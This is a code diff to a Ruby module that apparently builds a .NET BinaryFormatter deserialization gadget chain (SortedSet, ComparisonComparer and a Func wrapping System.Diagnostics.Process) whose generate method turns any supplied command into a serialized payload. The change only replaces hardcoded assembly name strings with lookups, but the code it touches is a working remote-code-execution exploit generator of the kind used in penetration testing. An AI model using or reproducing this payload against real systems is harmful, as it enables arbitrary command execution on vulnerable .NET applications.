@@ -11,9 +11,12 @@ module GadgetChains
     #     Contributors: Alvaro Munoz
 
     def self.generate(cmd)
+      mscorlib = Assemblies::VERSIONS['4.0.0.0'].fetch('mscorlib')
+      system = Assemblies::VERSIONS['4.0.0.0'].fetch('System')
+
       library = Types::RecordValues::BinaryLibrary.new(
         library_id: 2,
-        library_name: "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        library_name: system.to_s
       )
 
       obj_id_8 = Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
@@ -29,16 +32,16 @@ module GadgetChains
         member_values: [
           Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
             obj_id: 11,
-            string: 'System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'
+            string: "System.Func`3[[#{mscorlib['System.String']}],[#{mscorlib['System.String']}],[#{system['System.Diagnostics.Process']}]]"
           )),
           Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
             obj_id: 12,
-            string: 'mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+            string: mscorlib.to_s
           )),
           Types::Record.from_value(Types::RecordValues::ObjectNull.new),
           Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
             obj_id: 13,
-            string: 'System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+            string: system.to_s
           )),
           Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
             obj_id: 14,
@@ -88,14 +91,14 @@ module GadgetChains
         Types::RecordValues::ClassWithMembersAndTypes.from_member_values(
           class_info: Types::General::ClassInfo.new(
             obj_id: 1,
-            name: 'System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]',
+            name: "System.Collections.Generic.SortedSet`1[[#{mscorlib['System.String']}]]",
             member_names: %w{ Count Comparer Version Items }
           ),
           member_type_info: Types::General::MemberTypeInfo.new(
             binary_type_enums: %i{ Primitive SystemClass Primitive StringArray },
             additional_infos: [
               Enums::PrimitiveTypeEnum.fetch(:Int32),
-              'System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]',
+              "System.Collections.Generic.ComparisonComparer`1[[#{mscorlib['System.String']}]]",
               Enums::PrimitiveTypeEnum.fetch(:Int32)
             ]
           ),
@@ -110,7 +113,7 @@ module GadgetChains
         Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
           class_info: Types::General::ClassInfo.new(
             obj_id: 3,
-            name: 'System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]',
+            name: "System.Collections.Generic.ComparisonComparer`1[[#{mscorlib['System.String']}]]",
             member_names: %w{ _comparison }
           ),
           member_type_info: Types::General::MemberTypeInfo.new(
@@ -185,7 +188,7 @@ module GadgetChains
           member_values: [
             Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
               obj_id: 27,
-              string: 'System.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'
+              string: "System.Comparison`1[[#{mscorlib['System.String']}]]"
             )),
             Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 12)),
             Types::Record.from_value(Types::RecordValues::ObjectNull.new),
